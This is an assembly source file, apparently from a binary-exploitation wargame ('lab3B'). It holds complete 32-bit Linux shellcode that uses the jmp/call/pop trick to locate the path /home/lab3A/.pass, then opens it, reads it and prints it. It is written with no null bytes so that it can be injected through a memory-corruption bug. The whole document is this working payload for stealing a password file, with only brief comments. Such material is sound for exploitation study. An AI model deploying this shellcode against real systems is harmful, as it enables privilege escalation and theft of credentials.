; lab3B shellcode - open/read/write/exit on /home/lab3A/.pass (no execve)
; nasm -f bin sc.asm -o sc.bin

BITS 32

    jmp short get_path           ; skip the code, reach the call at the bottom
do_it:
    pop    esi                   ; esi = &"/home/lab3A/.pass" (pushed by the call)
    sub    esp, 0x100            ; scratch buffer below the shellcode for read()

    ; open(path, O_RDONLY, 0)
    xor    eax, eax
    mov    al, 5                 ; __NR_open
    mov    ebx, esi              ; path
    xor    ecx, ecx              ; O_RDONLY
    xor    edx, edx              ; mode 0
    int    0x80                  ; fd in eax

    ; read(fd, scratch, 0x100)
    mov    ebx, eax              ; fd
    xor    eax, eax
    mov    al, 3                 ; __NR_read
    mov    ecx, esp              ; scratch buffer
    xor    edx, edx
    mov    dh, 1                 ; count = 0x100
    int    0x80                  ; bytes read in eax

    ; write(1, scratch, n)
    mov    edx, eax              ; n = bytes read
    xor    eax, eax
    mov    al, 4                 ; __NR_write
    xor    ebx, ebx
    inc    ebx                   ; fd = 1 (stdout)
    int    0x80                  ; ecx still points at scratch

    ; exit(0)
    xor    eax, eax
    mov    al, 1                 ; __NR_exit
    xor    ebx, ebx
    int    0x80

get_path:
    call   do_it                 ; pushes the address of the string below, then jumps up
    db "/home/lab3A/.pass", 0x00
